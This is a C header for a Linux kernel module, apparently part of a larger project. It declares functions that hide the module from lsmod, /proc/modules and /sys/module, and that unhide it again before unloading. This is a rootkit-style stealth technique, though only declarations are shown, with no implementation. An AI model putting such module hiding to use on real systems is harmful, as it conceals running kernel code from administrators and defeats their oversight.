#ifndef BAT_HIDE_MODULE_H
#define BAT_HIDE_MODULE_H

#include <linux/module.h>
#include <linux/kobject.h>
#include <linux/list.h>
#include <linux/types.h>

struct module_hider_state {
    struct list_head *saved_prev;   /* list.prev before hiding */
    struct list_head *saved_next;   /* list.next before hiding */
    struct kobject   *saved_parent;
    struct kset      *saved_kset;
    struct kobject   *saved_holders_dir;
    bool hidden;
};

/* Hide THIS_MODULE from lsmod, /proc/modules, /sys/module.
 * Must be the LAST module to init. */
void module_hide_current(void);

/* Restore module visibility   required before delete_module() succeeds.
 * Called from sysfs unload handler (K-99 Phase 1). */
void module_unhide(void);

bool module_is_hidden(void);

/* No init/exit   called directly from main.c at the right moment */

#endif /* BAT_HIDE_MODULE_H */
